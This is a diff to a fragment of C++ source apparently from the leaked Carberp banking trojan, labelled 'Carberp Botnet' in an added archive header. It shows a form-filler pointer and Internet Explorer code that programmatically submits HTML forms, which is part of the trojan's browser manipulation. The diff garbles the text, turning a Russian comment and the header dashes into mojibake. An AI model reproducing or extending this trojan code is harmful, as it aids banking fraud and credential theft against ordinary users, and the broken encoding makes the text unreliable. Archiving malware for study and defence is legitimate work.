@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "std.h"
 
 FORM_FILL *lpFillerInfo=NULL;
@@ -38,7 +49,7 @@ void __fastcall TFMain::bUploadClick(TObject *Sender)
                 if(SUCCEEDED(pDisp3->QueryInterface(IID_IHTMLFormElement,
                                                     (LPVOID*)&HTMLForm)) && HTMLForm)
                 {
-                    HTMLForm->submit(); // нажимаем кнопку submit
+                    HTMLForm->submit(); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ submit
                     HTMLForm->Release();
                 }
                 pDisp3->Release();
